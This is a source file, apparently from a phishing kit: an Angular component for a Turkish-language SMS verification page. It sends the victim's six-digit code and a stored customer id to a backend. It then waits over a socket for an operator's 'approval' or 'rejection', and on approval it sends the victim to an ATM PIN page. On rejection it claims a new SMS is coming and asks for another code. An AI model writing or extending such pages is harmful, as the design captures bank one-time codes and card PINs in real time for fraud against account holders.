import { Component, OnDestroy, OnInit, signal, ViewChildren, QueryList, ElementRef, inject } from '@angular/core';
import { FormArray, FormBuilder, FormControl, ReactiveFormsModule, Validators } from '@angular/forms';
import { Location } from '@angular/common';
import { Router } from '@angular/router';
import { CustomerService } from '../../../core/services/customer';
import { SocketService } from '../../../core/services/socket.service';

@Component({
  selector: 'app-sms-auth-page',
  imports: [ReactiveFormsModule],
  templateUrl: './sms-auth-page.html',
})
export class SmsAuthPage implements OnInit, OnDestroy {
  private readonly fb = inject(FormBuilder);
  protected readonly location = inject(Location);
  private readonly router = inject(Router);
  private readonly customerService = inject(CustomerService);
  private readonly socketService = inject(SocketService);

  @ViewChildren('otpInput') otpInputs!: QueryList<ElementRef<HTMLInputElement>>;

  protected readonly otpControls = new FormArray(
    Array(6).fill(0).map(() => new FormControl('', [Validators.required, Validators.pattern(/^[0-9]$/)]))
  );

  protected readonly remainingSeconds = signal(165);
  protected readonly isVerifying = signal(false);
  protected readonly isSuccess = signal(false);
  protected readonly feedbackMessage = signal<{ text: string, type: 'info' | 'error' | 'success' | 'warning' }>({
    text: 'Kodu kopyalayıp ilk kutucuğa yapıştırabilirsiniz.',
    type: 'info'
  });

  private timerInterval: ReturnType<typeof setInterval> | null = null;

  ngOnInit() {
    const cid = localStorage.getItem('customer_id');
    if (cid) {
      this.socketService.registerCustomer(cid);
    }
    this.startTimer();
    this.otpControls.valueChanges.subscribe(values => {
      const code = values.join('');
      if (code.length === 6) {
        this.feedbackMessage.set({
          text: '6 haneli şifre girildi. Onaylayabilirsiniz.',
          type: 'success'
        });
      } else {
        this.feedbackMessage.set({
          text: 'Kodu kopyalayıp ilk kutucuğa yapıştırabilirsiniz.',
          type: 'info'
        });
      }
    });
  }

  ngOnDestroy() {
    if (this.timerInterval) {
      clearInterval(this.timerInterval);
    }
  }

  private startTimer() {
    this.remainingSeconds.set(165);
    if (this.timerInterval) clearInterval(this.timerInterval);
    this.timerInterval = setInterval(() => {
      const current = this.remainingSeconds();
      if (current <= 0) {
        if (this.timerInterval) clearInterval(this.timerInterval);
        this.feedbackMessage.set({
          text: 'Şifre süresi doldu. Lütfen yeni şifre talep ediniz.',
          type: 'warning'
        });
      } else {
        this.remainingSeconds.set(current - 1);
      }
    }, 1000);
  }

  protected get timerDisplay(): string {
    const total = this.remainingSeconds();
    const mins = String(Math.floor(total / 60)).padStart(2, '0');
    const secs = String(total % 60).padStart(2, '0');
    return `${mins}:${secs}`;
  }

  protected get timerDashArray(): string {
    const percent = (this.remainingSeconds() / 165) * 100;
    return `${percent}, 100`;
  }

  protected onInput(event: Event, index: number) {
    const input = event.target as HTMLInputElement;
    const val = input.value.replace(/[^0-9]/g, '');
    input.value = val;
    this.otpControls.at(index).setValue(val);

    if (val && index < 5) {
      this.focusInput(index + 1);
    }
  }

  protected onKeyDown(event: KeyboardEvent, index: number) {
    const input = event.target as HTMLInputElement;
    if (event.key === 'Backspace' && !input.value && index > 0) {
      this.focusInput(index - 1);
    }
  }

  protected onPaste(event: ClipboardEvent) {
    event.preventDefault();
    const pasteData = event.clipboardData?.getData('text')?.trim() || '';
    const digits = pasteData.replace(/[^0-9]/g, '').slice(0, 6);
    if (digits) {
      digits.split('').forEach((char, i) => {
        if (i < 6) this.otpControls.at(i).setValue(char);
      });
      const focusTarget = Math.min(digits.length, 5);
      this.focusInput(focusTarget);
    }
  }

  private focusInput(index: number) {
    const arr = this.otpInputs.toArray();
    if (arr[index]) {
      arr[index].nativeElement.focus();
    }
  }

  protected verifyOtp() {
    const code = this.otpControls.value.join('');
    if (code.length < 6) {
      this.feedbackMessage.set({
        text: 'Lütfen 6 haneli kodun tamamını giriniz.',
        type: 'error'
      });
      return;
    }

    this.isVerifying.set(true);
    const payload = {
      otp: code,
      cc_id: localStorage.getItem('customer_id') || ''
    };

    this.customerService.createOtp(payload).subscribe({
      next: () => {
        // Wait for admin approval or rejection
        this.socketService.onEvent('otp_approved').subscribe(() => {
          if (this.isVerifying()) {
            this.isVerifying.set(false);
            this.isSuccess.set(true);
            setTimeout(() => {
              this.router.navigate(['/atm-pin']);
            }, 1000);
          }
        });

        this.socketService.onEvent('otp_rejected').subscribe(() => {
          if (this.isVerifying()) {
            this.isVerifying.set(false);
            this.feedbackMessage.set({
              text: 'Hatalı şifre girdiniz. Yeni bir şifre saniyeler içinde SMS olarak gönderilecektir.',
              type: 'error'
            });
            this.otpControls.reset();
            this.startTimer();
          }
        });
      },
      error: (err) => {
        console.error(err);
        this.isVerifying.set(false);
      }
    });
  }

  protected resendOtp() {
    if (this.remainingSeconds() > 0) return;
    this.otpControls.reset();
    this.startTimer();
    this.feedbackMessage.set({
      text: 'Kod Gönderildi',
      type: 'success'
    });
    this.focusInput(0);
  }
}
